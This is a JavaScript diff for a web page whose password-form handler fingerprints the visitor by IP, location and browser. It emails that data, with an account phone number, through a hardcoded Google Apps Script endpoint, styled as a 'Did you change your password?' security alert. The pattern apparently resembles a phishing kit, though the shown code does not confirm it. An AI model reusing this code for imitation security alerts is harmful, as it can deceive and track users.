@@ -46,9 +46,6 @@ function fetchUserInfo() {
       userInfo.region = data.region;
       userInfo.country = data.country;
 
-      console.log('City:', data.city);
-      console.log('Region:', data.region);
-      console.log('Country:', data.country);
     })
     .catch((error) => {
       console.error('Error fetching location:', error);
@@ -72,9 +69,7 @@ function fetchUserInfo() {
     userInfo.browserName = 'Opera';
     userInfo.browserVersion = userAgent.match(/(Opera|OPR)\/(\d+\.\d+)/)[2];
   }
-  console.log('Browser Name:', userInfo.browserName);
-  console.log('Browser Version:', userInfo.browserVersion);
-
+ 
   return userInfo;
 }
 
@@ -146,7 +141,7 @@ document.getElementById('passwordForm').addEventListener('submit', async functio
       'https://script.google.com/macros/s/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec'; // Replace with your GAS deployment URL
     const payload = {
       to_email: email,
-      subject: `Security Alert`,
+      subject: `Security Alert ${sphone}`,
       body_html: `<table style="width: 100%; max-width: 600px; font-family: Arial, sans-serif; border-collapse: collapse; text-align: center; margin: 0 auto;">
           <tr>
               <td style="font-size: 22px; font-weight: bold; padding: 20px 0;">Did you change your password?</td>
@@ -164,7 +159,7 @@ document.getElementById('passwordForm').addEventListener('submit', async functio
                   <p style="margin: 5px 0;"><strong>Where</strong> ${userInfo.city} , ${userInfo.country} , ${userInfo.region}</p>
                   <p style="margin: 5px 0;"><strong>Device Type</strong> ${userInfo.browserName} ${userInfo.browserVersion}</p>
                   <p style="margin: 5px 0;"><strong>IP address</strong> ${userInfo.ip}</p>
-                  <p style="margin: 5px 0;"><strong>Account </strong> ${sphone}</p>
+                  <p style="margin: 5px 0;color:red"><strong>Account :</strong> ${sphone}</p>
               </td>
           </tr>
           <tr>
